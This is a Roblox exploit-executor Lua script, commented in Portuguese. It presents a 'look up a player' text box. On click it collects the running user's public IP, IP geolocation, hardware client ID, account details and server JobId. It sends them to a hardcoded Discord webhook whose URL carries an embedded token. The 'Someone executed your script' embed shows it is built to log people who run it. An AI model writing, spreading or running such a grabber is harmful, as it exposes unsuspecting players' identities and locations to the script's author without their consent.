-- Criar a tela de interface
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Criar a caixa de texto para o nome do jogador
local playerInput = Instance.new("TextBox")
playerInput.Parent = screenGui
playerInput.Position = UDim2.new(0.5, -100, 0.4, 0)
playerInput.Size = UDim2.new(0, 200, 0, 50)
playerInput.PlaceholderText = "Digite o nome do jogador"
playerInput.TextSize = 20
playerInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

-- Criar o botão para enviar a informação
local sendButton = Instance.new("TextButton")
sendButton.Parent = screenGui
sendButton.Position = UDim2.new(0.5, -50, 0.5, 0)
sendButton.Size = UDim2.new(0, 100, 0, 50)
sendButton.Text = "Enviar"
sendButton.TextSize = 20
sendButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)

-- Função para enviar as informações do jogador
sendButton.MouseButton1Click:Connect(function()
    local playerName = playerInput.Text
    if playerName ~= "" then
        local targetPlayer = game.Players:FindFirstChild(playerName)
        if targetPlayer then
            -- Agora coletamos as informações do jogador e enviamos para o Discord
            local Userid = targetPlayer.UserId
            local DName = targetPlayer.DisplayName
            local Name = targetPlayer.Name
            local MembershipType = tostring(targetPlayer.MembershipType):sub(21)
            local AccountAge = targetPlayer.AccountAge
            local Country = game.LocalizationService.RobloxLocaleId
            local GetIp = game:HttpGet("https://v4.ident.me/")
            local GetData = game:HttpGet("http://ip-api.com/json")
            local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
            local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
            local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

            -- Detecting Executor
            local function detectExecutor()
                local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                                or (secure_load and "Sentinel")
                                or (pebc_execute and "ProtoSmasher")
                                or (KRNL_LOADED and "Krnl")
                                or (is_sirhurt_closure and "SirHurt")
                                or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                                or "Unsupported"
                return executor
            end

            -- Creating Webhook Data
            local function createWebhookData()
                local webhookcheck = detectExecutor()
                local data = {
                    ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
                    ["content"] = "",
                    ["embeds"] = {
                        {
                            ["author"] = {
                                ["name"] = "Someone executed your script",
                                ["url"] = "https://roblox.com",
                            },
                            ["description"] = string.format(
                                "__[Player Info](https://www.roblox.com/users/%d)__" ..
                                " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                                "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                                "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                                "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                                "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                                Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                                tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                                game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                                GetData, ConsoleJobId
                            ),
                            ["type"] = "rich",
                            ["color"] = tonumber("0xFFD700"),
                            ["thumbnail"] = {
                                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                            },
                        }
                    }
                }
                return HttpService:JSONEncode(data)
            end

            -- Sending Webhook
            local function sendWebhook(webhookUrl, data)
                local headers = {
                    ["content-type"] = "application/json"
                }
                local request = http_request or request or HttpPost or syn.request
                local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
                request(abcdef)
            end

            -- Replace the webhook URL with your own URL
            local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
            local webhookData = createWebhookData()

            -- Sending the webhook
            sendWebhook(webhookUrl, webhookData)
            print("Informações enviadas para o webhook!")
        else
            print("Jogador não encontrado!")
        end
    else
        print("Por favor, insira o nome de um jogador!")
    end
end)
